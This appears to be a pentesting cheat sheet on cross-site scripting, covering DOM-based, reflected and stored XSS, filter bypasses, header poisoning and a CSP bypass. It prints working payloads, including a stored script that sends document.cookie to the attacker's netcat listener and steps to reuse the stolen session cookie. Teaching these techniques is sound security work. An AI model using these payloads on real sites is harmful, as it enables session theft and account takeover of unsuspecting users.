---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Cross-Site Scripting

Also known as XSS scripting, it allows the execution of malicious code of JavaScript or any client-side language. We can find different types of XSS scripting:

## <mark style="color:blue;">DOM-based</mark>

The vulnerability is in the client-side code, where the browserâ€™s Document Object Model (DOM), the one handled by HTML, is manipulated to execute untrusted scripts.

We can find a typical example of this vulnerability as follows:

* The URL shows changes in a parameter

<pre class="language-html" data-title="Example Case" data-overflow="wrap" data-line-numbers><code class="lang-html">&#x3C;!-- We select language in a slider and is reflected on url -->
http://url/?language=en

&#x3C;!-- Check html of the page for script tags and document.write() functions-->
...
&#x3C;select name="default">
<strong>  &#x3C;script>
</strong><strong>  ...
</strong>    document.write("&#x3C;option value='"+lang+"'>"+decodeURI(lang) + "&#x3C;/option>");
  ...
  &#x3C;/script>
&#x3C;/select>
...

&#x3C;!-- Use '> to close the "value" parameter and then close tags -->
http://url/?default='>&#x3C;/option>&#x3C;/select>   
&#x3C;!-- We will see all options of the slider are now displayed on screen -->

<strong>&#x3C;!-- Then we can create any tag to insert HMTL code-->
</strong>http://url/?default='>&#x3C;/option>&#x3C;/select>&#x3C;h1>HACKED&#x3C;/h1>

&#x3C;!-- We can even abuse this to inject JS code -->
http://url/?default='>&#x3C;/option>&#x3C;/select>&#x3C;script>if(window.confirm('HACKED\nTRY TO CALL FOR HELP?')){window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ');};&#x3C;/script>
</code></pre>

***

* In some cases, it will not work directly, so we can check the page code to see the conditions of the input.

{% tabs %}
{% tab title="Case 1" %}
Sometimes the script tag will be filtered.

{% code title="Example source code" %}
```php
...
if (stripos ($default, "<script") !== false) {
...
```
{% endcode %}

This could be bypassed using a `img` tag and then putting a bad `src` value which will cause an error. After that, we can handle it with the `onerror` parameter that lets us insert JS Code.

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/?default='></option></select><img src=x onerror='alert("HACKED")'/>
```
{% endcode %}
{% endtab %}

{% tab title="Case 2" %}
Sometimes the input will be filtered with specific values.

{% code title="Example source code" %}
```php
...
switch ($_GET['default']) { 
    case "French": 
    case "English":
...
```
{% endcode %}

This could be bypassed using any of these values at the start of the sentence, and then using a `&` to concatenate the payload of the injection.

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/?default=English&'></option></select><script>alert("HACKED")</script>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## <mark style="color:blue;">Reflected</mark>

The vulnerability occurs when the parameters inputted by the client, are displayed on the screen of the page when the site processes a request.

We can find typical examples of this vulnerability as follows:

* When a parameter is sent in a query of the URL or a formulary, and this value is shown on the page content

<pre class="language-bash" data-overflow="wrap" data-line-numbers data-full-width="false"><code class="lang-bash">#We do a petition and the site returns "Hello" in any part of the HTML
curl http://$url/?msg=$value 
# Then we could try to inject code
<strong>curl http://url/?msg=&#x3C;script>alert("HACKED")&#x3C;/script>
</strong>
#Or when we insert a value in a form and the site returns it in any part of the HTML, we could fill the form with code to inject
&#x3C;script>alert("HACKED")&#x3C;/script>
</code></pre>

***

* In some cases, it will not work directly, so we can check the page code to see the conditions of the input.

{% tabs %}
{% tab title="Case 1" %}
Sometimes the script tag will be filtered.

{% code title="Example source code" %}
```php
...
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
...
```
{% endcode %}

This could be bypassed by using capital letters on the tag values or using other symbols to evade filtering.

{% code overflow="wrap" lineNumbers="true" %}
```bash
<sCrIpT>alert("HACKED")</script>
<s|script>alert("HACKED")</script>
```
{% endcode %}
{% endtab %}

{% tab title="Case 2" %}
If that still doesn't work, we can use a `img` tag, and then put a bad `src` value which will cause an error. After that, we can handle it with the `onerror` parameter that lets us insert JS Code.

<pre class="language-bash"><code class="lang-bash"><strong>&#x3C;img src=x onerror='alert("HACKED")'/>
</strong></code></pre>
{% endtab %}
{% endtabs %}

## <mark style="color:blue;">Stored</mark>

The vulnerability occurs when the input of values is saved by the web and displayed to anyone who browses the site. In the same way, malicious code will remain globally on the website.

We can find a typical example of this vulnerability as follows:

* We find a list of entries, and we see a formulary that inputs fill those entries globally on the page.

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
#We insert names and comments in the formulary.
#Then we could fill the form to inject malicious code and show it to any other user that browse the website
<a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">CLICK HERE TO WIN A PRIZE</a>
```
{% endcode %}

{% hint style="info" %}
If we encounter a limitation on the length of the input, we can right-click the form space, go to _Inspect,_ and modify the `maxlength` value
{% endhint %}

## <mark style="color:blue;">Technics</mark>

Here we can find some specific techniques for various scenarios where we could do an XSS scripting attack:

### <mark style="color:orange;">Cookie Hijacking</mark>

When the application is vulnerable to XSS, we could try to hijack cookies such as session tokens that are being stored on the client-side.

Here we find an example of this scenario:

* In an accessed session we can go to the _Inspect>Application>Cookies_ tab and check the values that are being stored

{% code title="Example Output" overflow="wrap" lineNumbers="true" fullWidth="false" %}
```
Name               Value                              HttpOnly
...                ...                                ...
PHPIDSESSID        e15df96b271a9729837c2bb206b522c7
...                ...                                ...
```
{% endcode %}

{% hint style="info" %}
* If the `HttpOnly` tag is unmarked, indicates that the cookie can interact with JavaScript code
* `PHPIDSESSID` is the default session cookie on PHP-handled pages
{% endhint %}

***

* In case we don't see it directly, we can assume that is configured this way and try to get the cookie values by force. One way&#x20;



* Or we could get it directly to our host machine.  For this,  we set up a listener port with Netcat

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
nc -nlvp $port
```
{% endcode %}

***

* We can try to make a cookie hijacking using the Stored XSS vulnerable part

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
#We fill the form with the payload
<script>fetch("$IP:$port" + document.cookie);</script>
#This will get the information on the cookie values
```
{% endcode %}

{% hint style="info" %}
The `$IP` and `$port` values are from our machine and the port opened with Netcat
{% endhint %}

***

* Once we have the cookie value we can go to the website page, go to _Inspect>Application>Cookies_ tab, and set the cookie value manually. After that, we can reload the page to update these values on the browser.

```bash
Name               Value                             
...                ...                                
PHPIDSESSID        $hijackedCookie     #We set the cookie obtained   
...                ...
#This will log us into the session we stole without the need for credentials
```

### <mark style="color:orange;">Header Poisoning</mark>

Sometimes headers could be injected with XSS when its content is used directly in some functionalities of the app.

Here we find an example of this scenario:

* An application has a _See Your IP_ functionality which retrieves the information of the user's IP via the `X-Forwarded-For` header.

{% code title="Example Request" overflow="wrap" lineNumbers="true" fullWidth="false" %}
```http
GET http://$url HTTP/1.1
host: host
X-Forwarded-For: $IP
...
```
{% endcode %}

***

* We can inject JavaScript code, so when this function is triggered, the payload will be executed

{% code title="Example Request" overflow="wrap" lineNumbers="true" fullWidth="false" %}
```http
GET http://$url HTTP/1.1
host: host
X-Forwarded-For: <img src=x onerror='alert("HACKED")'/>
...
```
{% endcode %}

### <mark style="color:orange;">Content Security Policy Bypass</mark>

The `Content-Security-Policy` header defines rules for the validation of certain requests or inputs on an application. To bypass this verification we can modify the rules by poisoning our input.

Here we find an example of this scenario:

* A site lets us upload an image by entering the link of the location, and this process is validated with the security policy.

{% code title="Example Response" overflow="wrap" lineNumbers="true" fullWidth="false" %}
```http
HTTP/1.1 200 OK
host: host
Content-Security-Polic: img-src 'self' /src/image script-src 'self' $RestOfPolicy
...
```
{% endcode %}

***

* We can poison the input by adding a modified configuration for the security policy header, and after this, the other functions of the app where the security policy is applied will not be filtered properly, allowing us to use injections.

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
$input script-src 'unsafe-inline" 'self' $RestOfPolicy   #Fill on the image link
```
{% endcode %}
